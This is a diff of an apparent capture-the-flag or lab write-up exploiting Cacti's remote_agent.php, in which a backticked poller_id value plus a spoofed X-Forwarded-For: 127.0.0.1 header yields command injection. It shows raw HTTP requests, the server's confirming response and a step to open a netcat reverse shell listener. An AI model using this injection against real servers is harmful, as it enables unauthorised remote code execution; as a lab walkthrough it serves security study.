@@ -51,6 +51,8 @@ For further enumeration, `BurpSuite` was used against target how web application
 
 1. Send the intercepted request to `repeater` and change the request method
 ```
+REQUEST
+
 GET /index.php?__csrf_magic=sid%3A4e720e8aae8196d8ee3bbea3dcff20ce810a322a%2C1792046253&action=login&login_username=username&login_password=password HTTP/1.1
 Host: 10.129.228.231
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
@@ -60,14 +62,16 @@ Accept-Encoding: gzip, deflate, br
 Origin: http://10.129.228.231
 Connection: keep-alive
 Referer: http://10.129.228.231/index.php
-Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a4d9ef4fd0e4208d67650d4340cbed14
+Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a....
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
 <br>
 
-2. Switch `index.php` with `remote_agent.php`, which contains target parameter for exploitation. It is discovered that using `poller_id` parameter as cmd allowed Remote Code Execution to internal server.
+2. Switch `index.php` with `remote_agent.php`, which contains target parameter for exploitation. It is discovered that using `poller_id` parameter as cmd allowed Remote Code Execution to internal server by setting `local_data_ids[0]=6`.
 ```
+REQUEST
+
 GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`<bash>` HTTP/1.1
 X-Forwarded-For: 127.0.0.1
 Host: 10.129.228.231
@@ -78,11 +82,36 @@ Accept-Encoding: gzip, deflate, br
 Origin: http://10.129.228.231
 Connection: keep-alive
 Referer: http://10.129.228.231/index.php
-Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a4d9ef4fd0e4208d67650d4340cbed14
+Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a.....
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
 <br>
+
+3. Check if the exploit works properly by sending the editted request. Following response indicates that the exploitation is working even if the attacker cannot directly see output.
+```
+RESPONSE
+
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Thu, 15 Oct 2026 06:58:02 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+X-Powered-By: PHP/7.4.33
+Last-Modified: Thu, 15 Oct 2026 06:58:02 GMT
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
+P3P: CP="CAO PSA OUR"
+Cache-Control: no-store, no-cache, must-revalidate
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Content-Length: 55
+
+[{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
+```
+<br>
+
+4. start python listener on port 8000 and nc listener on any available port for reverse shell. 
 
 
 
